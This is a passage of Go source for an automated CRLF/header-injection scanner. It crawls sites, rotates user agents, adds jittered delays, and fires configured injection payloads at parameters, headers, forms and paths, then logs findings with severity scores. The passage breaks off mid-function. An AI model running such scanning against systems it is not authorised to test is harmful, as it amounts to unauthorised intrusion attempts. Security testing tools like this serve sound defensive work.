		for _, path := range s.config.CRLF.TestPaths {
			// Ensure path starts with /
			if !strings.HasPrefix(path, "/") {
				path = "/" + path
			}
			
			if !strings.HasPrefix(domain, "http://") && !strings.HasPrefix(domain, "https://") {
				httpsURL := fmt.Sprintf("https://%s%s", domain, path)
				httpURL := fmt.Sprintf("http://%s%s", domain, path)
				
				if isValidURL(httpsURL) && !s.shouldSkipURL(httpsURL) {
					targets = append(targets, httpsURL)
				}
				if isValidURL(httpURL) && !s.shouldSkipURL(httpURL) {
					targets = append(targets, httpURL)
				}
			} else {
				// Parse existing URL and append path
				parsed, err := url.Parse(domain)
				if err == nil {
					newURL := *parsed
					newURL.Path = path
					resultURL := newURL.String()
					if isValidURL(resultURL) && !s.shouldSkipURL(resultURL) {
						targets = append(targets, resultURL)
					}
				}
			}
		}
	}
	
	// Remove duplicates and filter valid URLs
	validTargets := []string{}
	seen := make(map[string]bool)
	
	for _, target := range targets {
		target = strings.TrimSpace(target)
		if target == "" {
			continue
		}
		
		if !isValidURL(target) {
			s.logger.Debug().Str("url", target).Msg("Skipping invalid URL")
			continue
		}
		
		if s.shouldSkipURL(target) {
			s.logger.Debug().Str("url", target).Msg("Skipping blocked/blacklisted URL")
			continue
		}
		
		if !seen[target] {
			seen[target] = true
			validTargets = append(validTargets, target)
		}
	}

	s.logger.Info().Int("total", len(validTargets)).Msg("Targets filtered and loaded")
	
	// Show skipped count if verbose
	if s.config.Output.Verbose && len(targets) > len(validTargets) {
		s.logger.Info().Int("skipped", len(targets)-len(validTargets)).Msg("URLs were skipped")
	}

	return validTargets, nil
}

// shouldSkipURL checks if a URL should be skipped
// shouldSkipURL checks if a URL should be skipped
func (s *CRLFScanner) shouldSkipURL(urlStr string) bool {
	// List of domains/patterns to skip
	skipPatterns := []string{
		// Security/scanning sites that block scanners
		"hackerone.com",
		"bugcrowd.com",
		"synack.com",
		"immunefi.com",
		"intigriti.com",
		
		// Large sites that may block or rate limit
		"google.com",
		"facebook.com",
		"twitter.com",
		"linkedin.com",
		"youtube.com",
		"instagram.com",
		"github.com",
		"microsoft.com",
		"apple.com",
		"amazon.com",
		"netflix.com",
		
		// Government/military
		".gov",
		".mil",
		".edu", // Sometimes strict
		
		// Add more as needed
	}
	
	parsed, err := url.Parse(urlStr)
	if err != nil {
		return true
	}
	
	// Extract base domain (remove www. and other subdomains)
	host := strings.ToLower(parsed.Host)
	
	// Remove port if present
	if strings.Contains(host, ":") {
		host = strings.Split(host, ":")[0]
	}
	
	// Remove www. prefix
	host = strings.TrimPrefix(host, "www.")
	
	// Check if host exactly matches or ends with skip patterns
	for _, pattern := range skipPatterns {
		if host == pattern || strings.HasSuffix(host, "."+pattern) {
			s.logger.Debug().Str("url", urlStr).Str("pattern", pattern).Msg("URL matches skip pattern")
			return true
		}
		// Check for TLD patterns (.gov, .mil, etc)
		if strings.HasPrefix(pattern, ".") && strings.HasSuffix(host, pattern) {
			s.logger.Debug().Str("url", urlStr).Str("pattern", pattern).Msg("URL matches TLD skip pattern")
			return true
		}
	}
	
	return false
}
// Create a basic wordlist if it doesn't exist
func createDefaultWordlist(path string) error {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		dir := filepath.Dir(path)
		if err := os.MkdirAll(dir, 0755); err != nil {
			return err
		}
		
		content := `# Default CRLF injection wordlist
/
/admin
/login
/logout
/register
/profile
/api
/api/v1
/api/v2
/webhook
/callback
/redirect
/return
/oauth/callback
/auth/callback
/settings
/config
`
		
		if err := os.WriteFile(path, []byte(content), 0644); err != nil {
			return err
		}
		fmt.Printf("Created default wordlist: %s\n", path)
	}
	return nil
}

// Spider task structure
type spiderTask struct {
	url   string
	depth int
}


// normalizeURL normalizes a URL for consistent processing
func (s *CRLFScanner) normalizeURL(urlStr string) string {
	urlStr = strings.TrimSpace(urlStr)
	if urlStr == "" {
		return ""
	}
	
	// Add scheme if missing
	if !strings.HasPrefix(urlStr, "http://") && !strings.HasPrefix(urlStr, "https://") {
		urlStr = "https://" + urlStr
	}
	
	parsed, err := url.Parse(urlStr)
	if err != nil {
		return ""
	}
	
	// Normalize host (lowercase, remove default ports)
	parsed.Host = strings.ToLower(parsed.Host)
	if parsed.Scheme == "http" && strings.HasSuffix(parsed.Host, ":80") {
		parsed.Host = strings.TrimSuffix(parsed.Host, ":80")
	}
	if parsed.Scheme == "https" && strings.HasSuffix(parsed.Host, ":443") {
		parsed.Host = strings.TrimSuffix(parsed.Host, ":443")
	}
	
	// Ensure path starts with /
	if parsed.Path == "" {
		parsed.Path = "/"
	}
	
	// Remove fragment
	parsed.Fragment = ""
	
	return parsed.String()
}

// Spider targets
// Spider targets
func (s *CRLFScanner) spiderTargets(targets []string) {
	// Create a channel for spider tasks with depth
	taskQueue := make(chan spiderTask, 10000)

	// Start spider workers
	workerCount := s.config.Scanner.Threads / 2
	if workerCount < 1 {
		workerCount = 1
	}
	
	for i := 0; i < workerCount; i++ {
		s.wg.Add()
		go s.spiderWorker(taskQueue)
	}

	// Add initial targets to queue with depth 0
	go func() {
		for _, target := range targets {
			// Normalize URL before checking
			normalizedURL := s.normalizeURL(target)
			if normalizedURL == "" {
				continue
			}
			
			// Check if should skip AFTER normalization
			if s.shouldSkipURL(normalizedURL) {
				s.logger.Debug().Str("url", normalizedURL).Msg("Skipping blacklisted URL in spider phase")
				continue
			}
			
			taskQueue <- spiderTask{url: normalizedURL, depth: 0}
		}
	}()

	// Wait for all workers to complete
	s.wg.Wait()
	close(taskQueue)

	s.logger.Info().Int64("pages", s.stats.SpiderPages).Msg("Spider phase completed")
}

// Spider worker
// Spider worker
func (s *CRLFScanner) spiderWorker(taskQueue chan spiderTask) {
	defer s.wg.Done()
	
	for task := range taskQueue {
		// Check if we've reached max pages
		if atomic.LoadInt64(&s.stats.SpiderPages) >= int64(s.config.Targets.MaxPages) {
			continue
		}

		// Normalize URL for consistent checking
		normalizedURL := s.normalizeURL(task.url)
		if normalizedURL == "" {
			continue
		}
		
		// Check if already visited at this depth (using normalized URL)
		key := fmt.Sprintf("%s:%d", normalizedURL, task.depth)
		if _, visited := s.visited.Load(key); visited {
			continue
		}
		s.visited.Store(key, true)

		// Double-check if should skip (in case URL was added before normalization)
		if s.shouldSkipURL(normalizedURL) {
			s.logger.Debug().Str("url", normalizedURL).Msg("Skipping blacklisted URL in worker")
			continue
		}

		// Rate limiting with jitter
		baseDelay := time.Second / time.Duration(s.config.Scanner.RateLimit)
		jitter := time.Duration(rand.Int63n(int64(baseDelay / 2)))
		time.Sleep(baseDelay + jitter)

		// Spider the URL
		result, err := s.spiderURL(normalizedURL)
		if err != nil {
			// Log timeout errors at debug level, others at warn level
			if strings.Contains(err.Error(), "timeout") || 
			   strings.Contains(err.Error(), "deadline") ||
			   strings.Contains(err.Error(), "Client.Timeout") {
				s.logger.Debug().Str("url", normalizedURL).Msg("Request timeout, skipping")
			} else if strings.Contains(err.Error(), "connection refused") ||
			          strings.Contains(err.Error(), "connection reset") {
				s.logger.Debug().Str("url", normalizedURL).Msg("Connection refused/reset, skipping")
			} else if strings.Contains(err.Error(), "too many redirects") {
				s.logger.Debug().Str("url", normalizedURL).Msg("Too many redirects, skipping")
			} else {
				s.logger.Warn().Err(err).Str("url", normalizedURL).Msg("Spider failed")
			}
			atomic.AddInt64(&s.stats.Errors, 1)
			continue
		}

		// Store result
		s.mu.Lock()
		s.spiderData = append(s.spiderData, *result)
		s.mu.Unlock()

		atomic.AddInt64(&s.stats.SpiderPages, 1)

		// Extract new URLs and add to queue if depth allows
		if task.depth < s.config.Targets.RecurseDepth {
			s.extractAndQueueURLs(result, taskQueue, task.depth+1)
		}
	}
}

// Extract and queue new URLs
// Extract and queue new URLs
func (s *CRLFScanner) extractAndQueueURLs(result *SpiderResult, taskQueue chan spiderTask, depth int) {
	// Queue all extracted links
	for _, link := range result.Links {
		// Normalize the link
		normalizedLink := s.normalizeURL(link)
		if normalizedLink == "" {
			continue
		}
		
		// Check if same domain
		base, err := url.Parse(result.URL)
		if err != nil {
			continue
		}

		linkURL, err := url.Parse(normalizedLink)
		if err != nil {
			continue
		}

		// Only follow same domain
		if base.Host != linkURL.Host {
			continue
		}

		// Check if we've already visited this URL at this depth
		key := fmt.Sprintf("%s:%d", normalizedLink, depth)
		if _, visited := s.visited.Load(key); visited {
			continue
		}

		// Add to queue
		select {
		case taskQueue <- spiderTask{url: normalizedLink, depth: depth}:
			// Successfully queued
		default:
			// Queue full, skip this URL
			s.logger.Debug().Str("url", normalizedLink).Msg("Queue full, skipping URL")
		}
	}
}

// convertHeaders converts http.Header to map[string]string
func convertHeaders(headers http.Header) map[string]string {
	result := make(map[string]string)
	for key, values := range headers {
		if len(values) > 0 {
			result[key] = values[0]
		}
	}
	return result
}

// Spider a single URL
// Spider a single URL
func (s *CRLFScanner) spiderURL(urlStr string) (*SpiderResult, error) {
	// Normalize URL first
	normalizedURL := s.normalizeURL(urlStr)
	if normalizedURL == "" {
		return nil, fmt.Errorf("invalid URL: %s", urlStr)
	}
	
	// Validate URL has scheme
	if !isValidURL(normalizedURL) {
		return nil, fmt.Errorf("invalid URL: %s", normalizedURL)
	}

	start := time.Now()

	// Parse URL to check host
	parsedURL, err := url.Parse(normalizedURL)
	if err != nil {
		return nil, fmt.Errorf("failed to parse URL: %w", err)
	}

	// Skip common non-web protocols
	if parsedURL.Scheme != "http" && parsedURL.Scheme != "https" {
		return nil, fmt.Errorf("unsupported scheme: %s", parsedURL.Scheme)
	}

	// Prepare request with random headers
	req := s.httpClient.R().
		SetHeader("User-Agent", s.getRandomUserAgent()).
		SetHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8").
		SetHeader("Accept-Language", "en-US,en;q=0.5").
		SetHeader("Accept-Encoding", "gzip, deflate, br").
		SetHeader("Connection", "keep-alive").
		SetHeader("Upgrade-Insecure-Requests", "1").
		SetHeader("Cache-Control", "max-age=0")

	// Add custom headers from config
	for key, value := range s.config.Headers.Custom {
		req.SetHeader(key, value)
	}

	// Add authentication if enabled
	if s.config.Auth.Enabled {
		s.applyAuthentication(req, normalizedURL)
	}

	// Add random delay before request (0-500ms)
	time.Sleep(time.Duration(rand.Intn(500)) * time.Millisecond)

	// Send request
	resp, err := req.Get(normalizedURL)
	if err != nil {
		// Check for specific timeout errors
		if strings.Contains(err.Error(), "context deadline") || 
		   strings.Contains(err.Error(), "Client.Timeout") ||
		   strings.Contains(err.Error(), "reading body") {
			return nil, fmt.Errorf("request timeout while reading response")
		}
		return nil, fmt.Errorf("HTTP request failed: %w", err)
	}

	// Check for rate limiting or blocking
	if resp.StatusCode() == 429 || resp.StatusCode() == 403 {
		return nil, fmt.Errorf("request blocked or rate limited (status %d)", resp.StatusCode())
	}

	duration := time.Since(start)

	// Get response body
	body := resp.Body()
	
	// Limit body processing to 2MB to avoid memory issues
	maxBodySize := 2 * 1024 * 1024 // 2MB
	if len(body) > maxBodySize {
		s.logger.Debug().Str("url", normalizedURL).Int("size", len(body)).Int("limit", maxBodySize).Msg("Response body truncated for processing")
		body = body[:maxBodySize]
	}

	result := &SpiderResult{
		URL:     normalizedURL,
		Status:  resp.StatusCode(),
		Headers: convertHeaders(resp.Header()),
		Size:    len(body),
		Time:    duration,
	}

	// Extract title if we have body
	if len(body) > 0 {
		if doc, err := goquery.NewDocumentFromReader(bytes.NewReader(body)); err == nil {
			result.Title = doc.Find("title").Text()
		}
	}

	// Extract links if enabled and we have body
	if s.config.Spider.ExtractURLs && len(body) > 0 {
		result.Links = s.extractLinks(normalizedURL, body)
	}

	// Extract forms if enabled and we have body
	if s.config.Spider.ExtractForms && len(body) > 0 {
		result.Forms = s.extractForms(normalizedURL, body)
	}

	// Extract parameters
	result.Parameters = s.extractParameters(normalizedURL)

	// Detect technology
	result.Technology = s.detectTechnology(resp)

	return result, nil
}
// Extract links from HTML
func (s *CRLFScanner) extractLinks(baseURL string, body []byte) []string {
	var links []string

	doc, err := goquery.NewDocumentFromReader(bytes.NewReader(body))
	if err != nil {
		return links
	}

	base, err := url.Parse(baseURL)
	if err != nil {
		return links
	}

	doc.Find("a[href], link[href], script[src], img[src], iframe[src]").Each(func(i int, sel *goquery.Selection) {
		if href, exists := sel.Attr("href"); exists {
			if absoluteURL := s.resolveURL(base, href); absoluteURL != "" {
				links = append(links, absoluteURL)
			}
		}
		if src, exists := sel.Attr("src"); exists {
			if absoluteURL := s.resolveURL(base, src); absoluteURL != "" {
				links = append(links, absoluteURL)
			}
		}
	})

	return uniqueStrings(links)
}

// Extract forms from HTML
func (s *CRLFScanner) extractForms(baseURL string, body []byte) []Form {
	var forms []Form

	doc, err := goquery.NewDocumentFromReader(bytes.NewReader(body))
	if err != nil {
		return forms
	}

	base, err := url.Parse(baseURL)
	if err != nil {
		return forms
	}

	doc.Find("form").Each(func(i int, sel *goquery.Selection) {
		action, _ := sel.Attr("action")
		method, _ := sel.Attr("method")
		enctype, _ := sel.Attr("enctype")

		if method == "" {
			method = "GET"
		}

		form := Form{
			Action:  s.resolveURL(base, action),
			Method:  strings.ToUpper(method),
			Enctype: enctype,
		}

		// Extract form inputs
		sel.Find("input, textarea, select").Each(func(j int, input *goquery.Selection) {
			name, _ := input.Attr("name")
			inputType, _ := input.Attr("type")
			value, _ := input.Attr("value")
			_, required := input.Attr("required")

			if name == "" {
				return
			}

			if inputType == "" {
				inputType = "text"
			}

			form.Inputs = append(form.Inputs, FormInput{
				Name:     name,
				Type:     inputType,
				Value:    value,
				Required: required,
			})
		})

		forms = append(forms, form)
	})

	return forms
}

// Extract parameters from URL
func (s *CRLFScanner) extractParameters(urlStr string) []Parameter {
	var params []Parameter

	parsed, err := url.Parse(urlStr)
	if err != nil {
		return params
	}

	// Query parameters
	for key := range parsed.Query() {
		params = append(params, Parameter{
			Name:     key,
			Location: "query",
			Type:     "string",
		})
	}

	// Path parameters (extract from path segments)
	pathSegments := strings.Split(strings.Trim(parsed.Path, "/"), "/")
	for _, segment := range pathSegments {
		if strings.Contains(segment, "{") && strings.Contains(segment, "}") {
			params = append(params, Parameter{
				Name:     strings.Trim(segment, "{}"),
				Location: "path",
				Type:     "string",
			})
		}
	}

	return params
}

// Detect technology from response
func (s *CRLFScanner) detectTechnology(resp *resty.Response) []string {
	var tech []string

	headers := resp.Header()
	body := string(resp.Body())

	// Detect via headers
	if server := headers.Get("Server"); server != "" {
		tech = append(tech, fmt.Sprintf("Server: %s", server))
	}

	if poweredBy := headers.Get("X-Powered-By"); poweredBy != "" {
		tech = append(tech, fmt.Sprintf("Powered-By: %s", poweredBy))
	}

	// Detect via body patterns
	patterns := map[string]string{
		`<meta.*content="WordPress`: "WordPress",
		`/wp-content/`:               "WordPress",
		`/wp-includes/`:              "WordPress",
		`Joomla!`:                    "Joomla",
		`Drupal.settings`:            "Drupal",
		`React.createElement`:        "React",
		`angular.module`:             "Angular",
		`vue.config`:                 "Vue.js",
		`jQuery`:                     "jQuery",
		`Bootstrap`:                  "Bootstrap",
		`Laravel`:                    "Laravel",
		`Django`:                     "Django",
		`Rails`:                      "Ruby on Rails",
		`ASP.NET`:                    "ASP.NET",
		`Spring`:                     "Spring Framework",
		`nodejs`:                     "Node.js",
		`express`:                    "Express.js",
		`nginx`:                      "nginx",
		`apache`:                     "Apache",
		`iis`:                        "IIS",
	}

	for pattern, technology := range patterns {
		if strings.Contains(body, pattern) {
			tech = append(tech, technology)
		}
	}

	return uniqueStrings(tech)
}

// Resolve relative URL to absolute
func (s *CRLFScanner) resolveURL(base *url.URL, href string) string {
	if href == "" {
		return ""
	}

	// Clean the href
	href = strings.TrimSpace(href)

	// Skip javascript, mailto, and fragment links
	if strings.HasPrefix(href, "javascript:") ||
		strings.HasPrefix(href, "mailto:") ||
		strings.HasPrefix(href, "#") ||
		strings.HasPrefix(href, "tel:") {
		return ""
	}

	// If href is just a path without leading slash, add it
	if !strings.HasPrefix(href, "/") && 
	   !strings.HasPrefix(href, "http://") && 
	   !strings.HasPrefix(href, "https://") &&
	   !strings.Contains(href, "://") {
		href = "/" + href
	}

	parsed, err := url.Parse(href)
	if err != nil {
		return ""
	}

	// If parsed URL has no scheme and no host, it's a relative path
	if parsed.Scheme == "" && parsed.Host == "" {
		parsed.Scheme = base.Scheme
		parsed.Host = base.Host
	}

	resolved := base.ResolveReference(parsed)

	// Only keep http and https URLs
	if resolved.Scheme != "http" && resolved.Scheme != "https" {
		return ""
	}

	// Normalize URL
	resolved.Fragment = ""

	return resolved.String()
}

// Test CRLF Injection
func (s *CRLFScanner) testCRLFInjection() {
	// Test each spidered URL
	for _, page := range s.spiderData {
		s.wg.Add()
		go func(page SpiderResult) {
			defer s.wg.Done()
			s.testPageCRLF(page)
		}(page)
	}

	s.wg.Wait()
}

// Test a single page for CRLF injection
func (s *CRLFScanner) testPageCRLF(page SpiderResult) {
	// Test URL parameters
	s.testURLParameters(page)

	// Test headers
	s.testHeaders(page)

	// Test forms
	s.testForms(page)

	// Test paths
	s.testPathInjection(page)
}

// Test URL parameters for CRLF injection
func (s *CRLFScanner) testURLParameters(page SpiderResult) {
	parsed, err := url.Parse(page.URL)
	if err != nil {
		return
	}

	// Collect all parameters to test
	var allParams []string
	
	// Add existing query parameters
	for _, param := range page.Parameters {
		if param.Location == "query" {
			allParams = append(allParams, param.Name)
		}
	}
	
	// Add common parameters
	allParams = append(allParams, s.config.CRLF.TestParams...)
	
	// Remove duplicates
	allParams = uniqueStrings(allParams)

	// Test each parameter individually
	for _, paramName := range allParams {
		s.testParameterInjection(parsed, paramName)
	}

	// Test combinations of parameters (2 at a time)
	for i := 0; i < len(allParams); i++ {
		for j := i + 1; j < len(allParams); j++ {
			s.testParameterCombination(parsed, allParams[i], allParams[j])
		}
	}

	// Test with different HTTP methods
	for _, method := range s.config.CRLF.TestMethods {
		s.testMethodInjection(parsed.String(), method)
	}
}

// Test parameter injection
func (s *CRLFScanner) testParameterInjection(baseURL *url.URL, paramName string) {
	for _, payload := range s.config.CRLF.Payloads {
		// Create a copy of the URL for each payload
		parsed, _ := url.Parse(baseURL.String())
		
		// Build URL with injected parameter
		query := parsed.Query()
		query.Set(paramName, payload)
		parsed.RawQuery = query.Encode()

		// Test the URL
		s.testInjection(parsed.String(), "GET", "parameter", paramName, payload)

		// Also test with POST
		s.testPostInjection(parsed.String(), paramName, payload)
	}
}

func (s *CRLFScanner) testParameterCombination(baseURL *url.URL, param1, param2 string) {
	// Test both parameters with CRLF payloads
	for _, payload1 := range s.config.CRLF.Payloads {
		for _, payload2 := range s.config.CRLF.Payloads {
			// Create a copy of the URL
			parsed, _ := url.Parse(baseURL.String())
			
			// Add both parameters
			query := parsed.Query()
			query.Set(param1, payload1)
			query.Set(param2, payload2)
			parsed.RawQuery = query.Encode()

			// Test the URL with both parameters
			s.testInjection(parsed.String(), "GET", "parameter", param1+","+param2, payload1+" & "+payload2)
		}
	}
}

// Test header injection
func (s *CRLFScanner) testHeaders(page SpiderResult) {
	for _, headerName := range s.config.CRLF.TestHeaders {
		for _, payload := range s.config.CRLF.Payloads {
			s.testHeaderInjection(page.URL, headerName, payload)
		}
	}

	// Test custom headers from config
	for headerName := range s.config.Headers.Custom {
		for _, payload := range s.config.CRLF.Payloads {
			s.testHeaderInjection(page.URL, headerName, payload)
		}
	}
}

// Test header injection
func (s *CRLFScanner) testHeaderInjection(urlStr, headerName, payload string) {
	// Prepare request with injected header
	req := s.httpClient.R().
		SetHeader("User-Agent", s.getRandomUserAgent()).
		SetHeader(headerName, payload)

	// Add authentication if enabled
	if s.config.Auth.Enabled {
		s.applyAuthentication(req, urlStr)
	}

	// Send request
	resp, err := req.Get(urlStr)
	if err != nil {
		return
	}

	atomic.AddInt64(&s.stats.TotalRequests, 1)

	// Check if injection was successful
	if s.checkCRLFInjection(resp, payload) {
		result := CRLFResult{
			URL:           urlStr,
			Method:        "GET",
			Payload:       payload,
			Header:        headerName,
			InjectionType: "header",
			Evidence:      s.extractEvidence(resp, payload),
			Status:        "vulnerable",
			Severity:      "high",
			CWE:           []string{"CWE-113", "CWE-117"},
			CVSS:          7.5,
			Timestamp:     time.Now(),
			Request:       s.extractRequestInfo(req),
			Response:      s.extractResponseInfo(resp),
		}

		s.addResult(result)
	}
}

// Test POST injection
func (s *CRLFScanner) testPostInjection(urlStr, paramName, payload string) {
	// Prepare POST request
	req := s.httpClient.R().
		SetHeader("User-Agent", s.getRandomUserAgent()).
		SetHeader("Content-Type", "application/x-www-form-urlencoded")

	// Add authentication if enabled
	if s.config.Auth.Enabled {
		s.applyAuthentication(req, urlStr)
	}

	// Set form data
	formData := map[string]string{
		paramName: payload,
	}

	resp, err := req.SetFormData(formData).Post(urlStr)
	if err != nil {
		return
	}

	atomic.AddInt64(&s.stats.TotalRequests, 1)

	// Check if injection was successful
	if s.checkCRLFInjection(resp, payload) {
		result := CRLFResult{
			URL:           urlStr,
			Method:        "POST",
			Payload:       payload,
			Parameter:     paramName,
			InjectionType: "parameter",
			Evidence:      s.extractEvidence(resp, payload),
			Status:        "vulnerable",
			Severity:      "high",
			CWE:           []string{"CWE-113", "CWE-117"},
			CVSS:          7.5,
			Timestamp:     time.Now(),
			Request:       s.extractRequestInfo(req),
			Response:      s.extractResponseInfo(resp),
		}

		s.addResult(result)
	}
}

// Test method injection
func (s *CRLFScanner) testMethodInjection(urlStr, method string) {
	for _, payload := range s.config.CRLF.Payloads {
		// Build URL with payload in path
		parsed, err := url.Parse(urlStr)
		if err != nil {
			continue
		}

		// Add payload to path
		parsed.Path = parsed.Path + "/" + payload

		// Prepare request
		req := s.httpClient.R().
			SetHeader("User-Agent", s.getRandomUserAgent())

		// Add authentication if enabled
		if s.config.Auth.Enabled {
			s.applyAuthentication(req, parsed.String())
		}

		var resp *resty.Response
		var errReq error

		// Send request with specified method
		switch method {
		case "GET":
			resp, errReq = req.Get(parsed.String())
		case "POST":
			resp, errReq = req.Post(parsed.String())
		case "PUT":
			resp, errReq = req.Put(parsed.String())
		case "DELETE":
			resp, errReq = req.Delete(parsed.String())
		case "PATCH":
			resp, errReq = req.Patch(parsed.String())
		default:
			continue
		}

		if errReq != nil {
			continue
		}

		atomic.AddInt64(&s.stats.TotalRequests, 1)

		// Check if injection was successful
		if s.checkCRLFInjection(resp, payload) {
			result := CRLFResult{
				URL:           parsed.String(),
				Method:        method,
				Payload:       payload,
				InjectionType: "path",
				Evidence:      s.extractEvidence(resp, payload),
				Status:        "vulnerable",
				Severity:      "medium",
				CWE:           []string{"CWE-113", "CWE-117"},
				CVSS:          6.5,
				Timestamp:     time.Now(),
				Request:       s.extractRequestInfo(req),
				Response:      s.extractResponseInfo(resp),
			}

			s.addResult(result)
		}
	}
}

// Test forms for CRLF injection
func (s *CRLFScanner) testForms(page SpiderResult) {
	for _, form := range page.Forms {
		for _, input := range form.Inputs {
			for _, payload := range s.config.CRLF.Payloads {
				s.testFormInjection(form, input.Name, payload)
			}
		}
	}
}

// Test form injection
func (s *CRLFScanner) testFormInjection(form Form, paramName, payload string) {
	if form.Action == "" {
		return
	}

	// Prepare request
	req := s.httpClient.R().
		SetHeader("User-Agent", s.getRandomUserAgent())

	// Set form data
	formData := map[string]string{
		paramName: payload,
	}

	// Set content type based on enctype
	if form.Enctype == "multipart/form-data" {
		req.SetHeader("Content-Type", "multipart/form-data")
	} else {
		req.SetHeader("Content-Type", "application/x-www-form-urlencoded")
	}

	// Add authentication if enabled
	if s.config.Auth.Enabled {
		s.applyAuthentication(req, form.Action)
	}

	var resp *resty.Response
	var err error

	// Send request based on method
	switch strings.ToUpper(form.Method) {
	case "GET":
		// For GET, add parameters to URL
		parsed, err := url.Parse(form.Action)
		if err != nil {
			return
		}
		query := parsed.Query()
		query.Set(paramName, payload)
		parsed.RawQuery = query.Encode()
		resp, err = req.Get(parsed.String())
	case "POST":
		resp, err = req.SetFormData(formData).Post(form.Action)
	case "PUT":
		resp, err = req.SetFormData(formData).Put(form.Action)
	default:
		return
	}

	if err != nil {
		return
	}

	atomic.AddInt64(&s.stats.TotalRequests, 1)

	// Check if injection was successful
	if s.checkCRLFInjection(resp, payload) {
		result := CRLFResult{
			URL:           form.Action,
			Method:        form.Method,
			Payload:       payload,
			Parameter:     paramName,
			InjectionType: "form",
			Evidence:      s.extractEvidence(resp, payload),
			Status:        "vulnerable",
			Severity:      "high",
			CWE:           []string{"CWE-113", "CWE-117"},
			CVSS:          7.5,
			Timestamp:     time.Now(),
			Request:       s.extractRequestInfo(req),
			Response:      s.extractResponseInfo(resp),
		}

		s.addResult(result)
	}
}

// Test path injection
func (s *CRLFScanner) testPathInjection(page SpiderResult) {
	parsed, err := url.Parse(page.URL)
	if err != nil {
		return
	}

	// Test each path segment
	pathSegments := strings.Split(strings.Trim(parsed.Path, "/"), "/")
	for i, segment := range pathSegments {
		for _, payload := range s.config.CRLF.Payloads {
			// Replace segment with payload
			newSegments := make([]string, len(pathSegments))
			copy(newSegments, pathSegments)
			newSegments[i] = payload

			newPath := "/" + strings.Join(newSegments, "/")
			parsed.Path = newPath

			s.testInjection(parsed.String(), "GET", "path", segment, payload)
		}
	}
}

// Generic injection test
func (s *CRLFScanner) testInjection(urlStr, method, injectionType, target, payload string) {
	// Prepare request
	req := s.httpClient.R().
		SetHeader("User-Agent", s.getRandomUserAgent())

	// Add authentication if enabled
	if s.config.Auth.Enabled {
		s.applyAuthentication(req, urlStr)
	}

	var resp *resty.Response
	var err error

	// Send request
	switch method {
	case "GET":
		resp, err = req.Get(urlStr)
	case "POST":
		resp, err = req.Post(urlStr)
	default:
		return
	}

	if err != nil {
		return
	}

	atomic.AddInt64(&s.stats.TotalRequests, 1)

	// Check if injection was successful
	if s.checkCRLFInjection(resp, payload) {
		result := CRLFResult{
			URL:           urlStr,
			Method:        method,
			Payload:       payload,
			Parameter:     target,
			InjectionType: injectionType,
			Evidence:      s.extractEvidence(resp, payload),
			Status:        "vulnerable",
			Severity:      s.determineSeverity(injectionType),
			CWE:           []string{"CWE-113", "CWE-117"},
			CVSS:          s.determineCVSS(injectionType),
			Timestamp:     time.Now(),
			Request:       s.extractRequestInfo(req),
			Response:      s.extractResponseInfo(resp),
		}

		s.addResult(result)
	}
}

// Check if CRLF injection was successful
func (s *CRLFScanner) checkCRLFInjection(resp *resty.Response, payload string) bool {
	// Check response headers
	headers := resp.Header()
	for _, headerValues := range headers {
		for _, headerValue := range headerValues {
			// Check if our payload appears in headers
			if strings.Contains(headerValue, payload) {
				return true
			}

			// Check for CRLF patterns
			for _, pattern := range s.config.CRLF.DetectionPatterns {
				re := regexp.MustCompile(pattern)
				if re.MatchString(headerValue) {
					return true
				}
			}
		}
	}

	// Check response body
	body := string(resp.Body())
	if strings.Contains(body, payload) {
		return true
	}

	// Check for CRLF patterns in body
	for _, pattern := range s.config.CRLF.DetectionPatterns {
		re := regexp.MustCompile(pattern)
		if re.MatchString(body) {
			return true
		}
	}

	return false
}

// Extract evidence from response
func (s *CRLFScanner) extractEvidence(resp *resty.Response, payload string) string {
	var evidence []string

	// Check headers
	headers := resp.Header()
	for headerName, headerValues := range headers {
		for _, headerValue := range headerValues {
			if strings.Contains(headerValue, payload) {
				evidence = append(evidence, fmt.Sprintf("Header %s: %s", headerName, headerValue))
			}
		}
	}

	// Check body
	body := string(resp.Body())
	if strings.Contains(body, payload) {
		// Get snippet around payload
		idx := strings.Index(body, payload)
		start := max(0, idx-50)
		end := min(len(body), idx+len(payload)+50)
		evidence = append(evidence, fmt.Sprintf("Body: ...%s...", body[start:end]))
	}

	return strings.Join(evidence, " | ")
}

// Extract request information
func (s *CRLFScanner) extractRequestInfo(req *resty.Request) map[string]string {
	info := make(map[string]string)

	// Note: resty.Request doesn't expose all internals easily
	// This is a simplified version
	info["method"] = "GET" // Default
	info["url"] = req.URL

	return info
}

// Extract response information
func (s *CRLFScanner) extractResponseInfo(resp *resty.Response) map[string]string {
	info := make(map[string]string)

	info["status"] = strconv.Itoa(resp.StatusCode())
	info["size"] = strconv.Itoa(len(resp.Body()))

	// Add important headers
	headers := resp.Header()
	for _, header := range []string{"Set-Cookie", "Location", "Server", "X-Powered-By"} {
		if value := headers.Get(header); value != "" {
			info[header] = value
		}
	}

	return info
}

// Determine severity based on injection type
func (s *CRLFScanner) determineSeverity(injectionType string) string {
	switch injectionType {
	case "header", "parameter":
		return "high"
	case "path", "form":
		return "medium"
	default:
		return "low"
	}
}

// Determine CVSS score
func (s *CRLFScanner) determineCVSS(injectionType string) float64 {
	switch injectionType {
	case "header", "parameter":
		return 7.5
	case "path", "form":
		return 6.5
	default:
		return 5.0
	}
}

// Add result
func (s *CRLFScanner) addResult(result CRLFResult) {
	s.mu.Lock()
	defer s.mu.Unlock()

	s.results = append(s.results, result)

	// Update statistics
	atomic.AddInt64(&s.stats.CRLFInjected, 1)
	atomic.AddInt64(&s.stats.Vulnerabilities, 1)

	switch result.Severity {
	case "critical":
		atomic.AddInt64(&s.stats.Critical, 1)
	case "high":
		atomic.AddInt64(&s.stats.High, 1)
	case "medium":
		atomic.AddInt64(&s.stats.Medium, 1)
	case "low":
		atomic.AddInt64(&s.stats.Low, 1)
	}

	// Log finding
	s.logger.Warn().
		Str("url", result.URL).
		Str("type", result.InjectionType).
		Str("severity", result.Severity).
		Msg("CRLF injection found")
}

// Apply authentication to request
func (s *CRLFScanner) applyAuthentication(req *resty.Request, urlStr string) {
	if !s.config.Auth.Enabled {
		return
	}

	// Check if we have a valid session for this URL
	if session, exists := s.authSessions[urlStr]; exists && session.Valid {
		// Use existing session
		for key, value := range session.Headers {
			req.SetHeader(key, value)
		}

		// Add cookies
		for _, cookie := range session.Cookies {
			req.SetCookie(cookie)
		}

		return
	}

	// Try different authentication methods
	for _, method := range s.config.Auth.Methods {
		switch method {
		case "basic":
